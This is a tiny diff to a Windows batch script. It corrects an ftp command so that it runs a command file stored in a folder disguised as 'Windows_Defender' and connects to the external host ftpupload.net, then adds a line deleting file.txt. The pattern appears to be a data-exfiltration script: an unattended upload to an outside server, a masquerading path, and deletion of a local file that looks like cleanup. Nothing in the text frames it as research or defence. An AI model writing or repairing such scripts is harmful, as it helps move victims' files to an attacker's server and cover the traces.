@@ -1,3 +1,4 @@
 @echo off
-ftp -s:ftp_commands.txt C:\Windows_Defender\temp\cache\temp\ftpupload.net
+ftp -s:C:\Windows_Defender\temp\cache\temp\ftp_commands.txt ftpupload.net
+del file.txt
 exit
